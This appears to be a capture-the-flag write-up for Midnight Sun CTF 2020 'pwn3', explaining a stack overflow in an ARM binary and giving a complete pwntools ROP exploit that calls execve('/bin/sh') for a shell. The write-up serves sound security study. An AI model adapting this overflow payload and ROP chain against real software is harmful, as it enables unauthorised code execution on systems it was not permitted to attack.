---
layout: post
title: Midnight Sun CTF 2020 Quals - pwn3
---

> An homage to pwny.racing, we present... speedrun pwn challenges. These bite-sized challenges should serve as a nice warm-up for your pwning skills.
>
> Files: [repo][repo]

## Analysis

Binary info:

{% highlight shell_session %}
pwn3: ELF 32-bit LSB executable, ARM, EABI5 version 1 (GNU/Linux), statically linked,
for GNU/Linux 3.2.0, BuildID[sha1]=46d0723fb9ff9add7b00860a2382f32656a04700, stripped

Arch:     arm-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x10000)
{% endhighlight %}

In this challenge we are dealing with 32bit statically linked arm binary. It contains simple buffer overflow vulnerability.

![code decompiled][decompiled]

Sending 512 bytes casues crash that overwrite program counter (pc) at offset 144. Since the binary is compiled with NX bit it is required to use ROP technique.

{% highlight python %}
payload = (
    b"A" * 140 +

    p32(0x00010170) + # : pop {r3, pc}
    p32(0x43434343) +
    p32(0x00036359) + #  (0x00036359): pop {r0, r1, r2, r6, r7, pc};
    p32(0x00049018) + #  /bin/sh
    p32(0x0) + # r1
    p32(0x0) + # r2
    p32(0x44444444) + # r6
    p32(0xb) + # r7 - execve
    p32(0x00010915) + # (0x00010915): svc #0; pop {r7, pc};
    p32(0x49494949)
)
{% endhighlight %}

We compose our payload with 3 gadgets.
1. Gadget responsible for adjusting stack - `pop {r3, pc}`
2. Gadget setting up registers to our values - `pop {r0, r1, r2, r6, r7, pc}`

r0 - arg1 - address of /bin/sh (can be found in the binary)
r1 - arg2 - 0x0
r2 - arg3 - 0x0
r6 - junk 
r7 - execve syscall number - 0xb

3. Gadget that executes syscall - `svc $0, pop r{7, pc}`

Sending payload to the target results in getting interactive shell.

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

payload = (
    b"A" * 140 +

    p32(0x00010170) + # : pop {r3, pc}
    p32(0x43434343) +
    p32(0x00036359) + #  (0x00036359): pop {r0, r1, r2, r6, r7, pc};
    p32(0x00049018) + #  /bin/sh
    p32(0x0) + # r1
    p32(0x0) + # r2
    p32(0x44444444) + # r6
    p32(0xb) + # r7 - execve
    p32(0x00010915) + # (0x00010915): svc #0; pop {r7, pc};
    p32(0x49494949)
)
payload += b"B" * (511 - len(payload))
with open("input", "wb+") as f:
    f.write(payload)

io = process(["qemu-arm", "./pwn3"])
#io = process(["qemu-arm", "-g", "2222", "./pwn3"])
#io = remote("pwn3-01.play.midnightsunctf.se", 10003)

io.recvuntil("buffer: ")
io.sendline(payload)

io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/midnightsun/pwn3
[decompiled]: {{site.baseurl}}/ctf/2020-04-13-midnightsunctf-pwn3/decompiled.png
